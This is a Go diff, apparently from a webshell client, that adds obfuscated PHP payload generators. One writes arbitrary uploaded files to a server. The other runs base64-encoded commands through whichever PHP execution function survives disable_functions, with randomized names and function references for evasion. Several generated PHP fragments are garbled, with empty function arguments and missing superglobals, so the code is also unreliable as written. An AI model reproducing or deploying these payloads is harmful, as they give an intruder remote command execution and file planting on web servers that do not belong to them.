@@ -43,10 +43,11 @@ func randomHex(n int) string {
 }
 
 const (
-	placeholderBase64Path = "#{base64::path}"
-	placeholderBase64Bin  = "#{base64::bin}"
-	placeholderBase64Cmd  = "#{base64::cmd}"
-	placeholderBase64Env  = "#{base64::env}"
+	placeholderBase64Path    = "#{base64::path}"
+	placeholderBase64Bin     = "#{base64::bin}"
+	placeholderBase64Cmd     = "#{base64::cmd}"
+	placeholderBase64Env     = "#{base64::env}"
+	placeholderBase64Content = "#{base64::content}"
 )
 
 type Separators struct {
@@ -210,4 +211,100 @@ func (t *PHPTemplates) FileDownload() (string, map[string]string) {
 	code := b64S + ";" + "$Q=" + b64R + "(substr($_POST[\"" + v + "\"],0));"
 	code += "$P=@fopen($Q,\"rb\");if($P===false){echo(\"" + errPrefix + "FILE_OPEN_FAILED\");}else{@fclose($P);$N=@readfile($Q);if($N===false){echo(\"" + errPrefix + "FILE_READ_FAILED\");}}"
 	return code, map[string]string{v: placeholderBase64Path}
+}
+
+func (t *PHPTemplates) FileUpload() (string, map[string]string) {
+	v1 := randomVar6()
+	v2 := randomVar6()
+	errPrefix := "ERR:" + randomHex(8) + ":"
+	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
+	code := b64S + ";" +
+		`$p=` + b64R + `(substr($_POST["` + v1 + `"],0));` +
+		`$c=` + b64R + `(substr($_POST["` + v2 + `"],0));` +
+		`$f=@fopen($p,"w");` +
+		`if($f===false){echo("` + errPrefix + `OPEN_FAILED");exit;}` +
+		`$n=@fwrite($f,$c);` +
+		`@fclose($f);` +
+		`if($n===false||$n!==strlen($c)){echo "0";}else{echo "1";}`
+	return code, map[string]string{v1: placeholderBase64Path, v2: placeholderBase64Content}
+}
+
+// CompactExec 生成紧凑的执行模式 PHP 代码，引擎函数在 Shell 部署时一次性加载，
+// 后续通信只传 action=exec&cmd=<base64> 等紧凑参数。
+// 当前模式保留作为 fallback。
+func (t *PHPTemplates) CompactExec() (string, map[string]string) {
+	v := [3]string{randomVar6(), randomVar6(), randomVar6()}
+
+	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
+	sysR := obfuscatedFuncRefSubstr("system")
+	psR := obfuscatedFuncRefSubstr("passthru")
+	seR := obfuscatedFuncRefSubstr("shell_exec")
+	exR := obfuscatedFuncRefSubstr("exec")
+	poR := obfuscatedFuncRefSubstr("popen")
+	prR := obfuscatedFuncRefSubstr("proc_open")
+
+	varP := phpVar6()
+	varS := phpVar6()
+	varEnv := phpVar6()
+	varC := phpVar6()
+	varR := phpVar6()
+	varRet := phpVar6()
+	varO := phpVar6()
+	varDir := phpVar6()
+	varFe := phpVar6()
+	varRuncmd := phpVar6()
+	varEnvArr := phpVar6()
+	varEnvKey := phpVar6()
+
+	checks := []funcCheck{
+		{ref: sysR, caller: fmt.Sprintf("@%s($%s,$%s)", sysR, varC, varRet)},
+		{ref: psR, caller: fmt.Sprintf("@%s($%s,$%s)", psR, varC, varRet)},
+		{ref: seR, caller: fmt.Sprintf("print(@%s($%s))", seR, varC)},
+		{ref: exR, caller: fmt.Sprintf("@%s($%s,$%s,$%s);print(join(\"\\n\",$%s))", exR, varC, varO, varRet, varO)},
+		{ref: poR, caller: fmt.Sprintf("$%s=@%s($%s,'r');while(!@feof($%s)){print(@fgets($%s,2048));}@pclose($%s)", phpVar6(), poR, varC, phpVar6(), phpVar6(), phpVar6())},
+		{ref: prR, caller: fmt.Sprintf("$%s=@%s($%s,array(1=>array('pipe','w'),2=>array('redirect',1)),$%s);while(!@feof($%s[1])){print(@fgets($%s[1],2048));}$%s=0;@fclose($%s[1]);@fclose($%s[2]);@proc_close($%s)", phpVar6(), prR, varC, phpVar6(), phpVar6(), phpVar6(), phpVar6(), varRet, phpVar6(), phpVar6())},
+	}
+	shuffleChecks(checks)
+
+	ifElseChain := ""
+	for i, check := range checks {
+		cond := "if"
+		if i > 0 {
+			cond = "elseif"
+		}
+		ifElseChain += cond + "(fe(" + check.ref + ")){" + check.caller + "}"
+	}
+	ifElseChain += "else{$" + varRet + "=127;}"
+
+	code := "" +
+		b64S + ";" +
+		"if(!function_exists('fe')){" +
+		"function fe(){$" + varFe + "=explode(',',@ini_get('disable_functions'));" +
+		"if(empty($" + varFe + ")){$" + varFe + "=array();}else{$" + varFe + "=array_map('trim',array_map('strtolower',$" + varFe + "));}" +
+		"return(function_exists()&&is_callable()&&!in_array(,$" + varFe + "));}}" +
+		"if(!function_exists('runcmd')){" +
+		"function runcmd($" + varRuncmd + "){global " + buildGlobalList([]funcCheck{{ref: sysR}, {ref: psR}, {ref: seR}, {ref: exR}, {ref: poR}, {ref: prR}}) + ";$" + varRet + "=0;" +
+		ifElseChain +
+		"return $" + varRet + ";}}" +
+		"$" + varP + "=" + b64R + "(substr(['" + v[0] + "'],0));" +
+		"$" + varS + "=" + b64R + "(substr(['" + v[1] + "'],0));" +
+		"$" + varEnv + "=@" + b64R + "(substr(['" + v[2] + "'],0));" +
+		"$" + varDir + "=dirname(['SCRIPT_FILENAME']);" +
+		"$" + varC + "=(substr($" + varDir + ",0,1)=='/')?'-c ' . '\"' . $" + varS + ".'\"' : '/c ' . '\"' . $" + varS + ".'\"';" +
+		"if(substr($" + varDir + ",0,1)=='/'){" +
+		"  @putenv('PATH=' . getenv('PATH') . ':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');" +
+		"}else{" +
+		"  @putenv('PATH=' . getenv('PATH') . ';C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;');" +
+		"}" +
+		"if(!empty($" + varEnv + ")){$" + varEnvArr + "=explode('" + NewSeparators().LineSep + "',$" + varEnv + ");foreach($" + varEnvArr + " as $" + varEnvKey + "){if(!empty($" + varEnvKey + ")){@putenv(str_replace('" + NewSeparators().KeySep + "','=',$" + varEnvKey + "));}}}" +
+		"$" + varR + "=$" + varP + ".' '.$" + varC + ";" +
+		"$" + varRet + "=@runcmd($" + varR + ");" +
+		"if($" + varRet + "!=0){echo 'ret=' . $" + varRet + ";}"
+
+	params := map[string]string{
+		v[0]: placeholderBase64Bin,
+		v[1]: placeholderBase64Cmd,
+		v[2]: placeholderBase64Env,
+	}
+	return code, params
 }
